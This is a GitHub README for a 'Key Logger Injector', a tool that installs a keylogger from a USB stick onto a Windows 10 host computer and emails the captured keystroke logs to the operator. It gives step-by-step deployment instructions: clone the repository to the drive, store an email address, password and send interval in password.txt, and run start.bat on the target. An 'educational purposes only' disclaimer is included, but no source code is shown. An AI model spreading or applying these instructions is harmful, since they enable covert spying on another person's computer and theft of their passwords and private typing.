# Key Logger Injector
![GitHub release (latest by date)](https://img.shields.io/github/v/release/ahmedhamedaly/Key-Logger-Injector?style=for-the-badge) 
![APM](https://img.shields.io/apm/l/test?style=for-the-badge)
![GitHub repo size](https://img.shields.io/github/repo-size/ahmedhamedaly/Key-Logger-Injector?style=for-the-badge)
![GitHub followers](https://img.shields.io/github/followers/ahmedhamedaly?style=for-the-badge)

A Simple Key Logger Injector That Sends You Frequent Emails About The Host Computers Logs.

## Getting Started

**DISCLAIMER**: This software is for **EDUCATIONAL PURPOSES ONLY**. Don't use the software for illegal activities. You are the only responsable for your actions. This software is intended as a personal project to learn more about software security and simple hack attempts. Please refer to the **[LICENSE](https://github.com/ahmedhamedaly/Key-Logger-Injector/blob/master/LICENSE)** for more information.

## Prerequisites

The project contains its own embedded version  of Python 3.9.0 with all required dependencies to run the project. You will also need a usb drive with atleast 70mb of free space. I recommend you use a 2gb usb drive. Below are some of the few websites I recommend but you purchase from:

* [Amazon EASTBULL USB Stick (2 pack)](https://www.amazon.co.uk/EASTBULL-Stick-Memory-Drive%EF%BC%88Black-Lanyard/dp/B07VWPY3G4/ref=sr_1_3)
* [Aliexpress Mini USB Stick](https://www.aliexpress.com/item/33037669106.html)

## Installation

Clone the repository to a usb stick that you wish to use to inject the software in the host computer.

```bash
git clone https://github.com/ahmedhamedaly/Key-Logger-Injector
```

Make sure to create a **```password.txt```** file in the **```src```** directory of the clone in the following format:
```
sample@email.com
Password123
600
```
The last line is the interval of wish you would like to receive emails with the logs.

## Usage

To inject the software in the host pc, make sure the host pc is running Windows 10 and that the flash drive is inserted.

To run the injection processes. Double click on the **```start.bat```** file and wait until it has stopped printing things out, usually about 5-10 seconds, in which you can close the command terminal and wait until you receive mail.

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Roadmap

See the [open issues](https://github.com/ahmedhamedaly/Key-Logger-Injector/issues) for a list of proposed features (and known issues).


## License
Distributed under the [MIT](https://github.com/ahmedhamedaly/Key-Logger-Injector/blob/master/LICENSE) License. See `LICENSE` for more information.
